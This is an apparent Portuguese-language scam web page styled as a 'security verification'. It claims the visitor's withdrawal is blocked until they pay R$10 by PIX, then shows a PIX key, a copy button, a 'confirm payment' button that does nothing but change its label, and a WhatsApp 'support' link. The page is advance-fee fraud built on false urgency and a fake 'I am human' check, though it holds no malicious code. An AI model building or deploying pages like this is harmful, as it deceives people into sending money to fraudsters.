<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔒 Verificação de Segurança</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #fff5e1;
            text-align: center;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 420px;
            margin: 50px auto;
            background: #ffffff;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0px 6px 15px rgba(0, 0, 0, 0.1);
            animation: fadeIn 0.5s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        h2 {
            color: #ff6600;
            font-size: 22px;
        }

        p {
            font-size: 15px;
            color: #444;
            text-align: left;
            line-height: 1.6;
        }

        .alert-box {
            background-color: #ffebcc;
            color: #cc5200;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 15px;
            border: 1px solid #ffcc99;
        }

        .verify-btn {
            display: block;
            width: 100%;
            padding: 14px;
            font-size: 18px;
            font-weight: bold;
            color: white;
            background: #ff6600;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            margin: 20px 0;
            transition: 0.3s;
        }

        .verify-btn:hover {
            opacity: 0.9;
        }

        .hidden {
            display: none;
        }

        .pix-box {
            background: #f9f9f9;
            padding: 12px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: bold;
            color: #333;
            border: 1px solid #ddd;
            margin-top: 10px;
        }

        .button {
            display: block;
            width: 100%;
            padding: 14px;
            margin-top: 10px;
            font-size: 16px;
            font-weight: bold;
            border: none;
            cursor: pointer;
            border-radius: 8px;
        }

        .copy-btn {
            background-color: #ff6600;
            color: #fff;
        }

        .confirm-btn {
            background-color: #28a745;
            color: white;
        }

        .support-btn {
            display: block;
            background: none;
            color: #ff6600;
            text-decoration: underline;
            font-size: 14px;
            cursor: pointer;
            padding: 10px;
            margin-top: 5px;
        }

        .home-btn {
            background-color: #000000;
            color: white;
        }

        .button:hover {
            opacity: 0.9;
        }

        .highlight {
            color: #ff6600;
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>⚠️ Atenção: Seu pagamento está pendente!</h2>

    <div class="alert-box">
        🚀 <strong>IMPORTANTE:</strong> Para sua segurança, seu saque está temporariamente bloqueado! Siga os passos abaixo para liberar o pagamento.
    </div>

    <p><strong>Por que essa verificação é necessária?</strong></p>
    <p>
        Para evitar fraudes e garantir que apenas usuários legítimos recebam pagamentos, é necessário realizar uma <strong>verificação via PIX no valor de <span class="highlight">R$ 10,00</span></strong>.
    </p>

    <p>
        ✔️ <strong>Após a verificação</strong>, seu saque será liberado <span class="highlight">IMEDIATAMENTE</span> e o valor cairá na sua conta na hora!
    </p>

    <button class="verify-btn" id="verifyButton">✔ Eu sou humano</button>

    <div id="content" class="hidden">
        <p><strong>Copie a chave PIX abaixo e faça o pagamento:</strong></p>
        <div class="pix-box" id="pixKey">678d91ef-d74a-4e30-80c7-69e06870c343</div>

        <button class="button copy-btn" id="copyButton">📋 Copiar Chave PIX</button>
        <button class="button confirm-btn" id="confirmButton">✅ Confirmar Pagamento</button>
        
        <a href="https://wa.me/17996167217" class="support-btn" target="_blank">📞 Suporte</a>
        <button class="button home-btn" id="homeButton">⬅ Voltar ao Início</button>
    </div>
</div>

<script>
    document.getElementById("verifyButton").addEventListener("click", function() {
        document.getElementById("content").classList.remove("hidden");
        this.style.display = "none";
    });

    document.getElementById("copyButton").addEventListener("click", function() {
        let pixKey = document.getElementById("pixKey").innerText;
        navigator.clipboard.writeText(pixKey).then(() => {
            alert("✅ Chave PIX copiada! Agora faça o pagamento.");
        });
    });

    document.getElementById("confirmButton").addEventListener("click", function() {
        this.textContent = "⏳ Aguardando pagamento...";
        this.style.backgroundColor = "#FFA500";
    });

    document.getElementById("homeButton").addEventListener("click", function() {
        window.location.href = "index.php";
    });
</script>

</body>
</html>
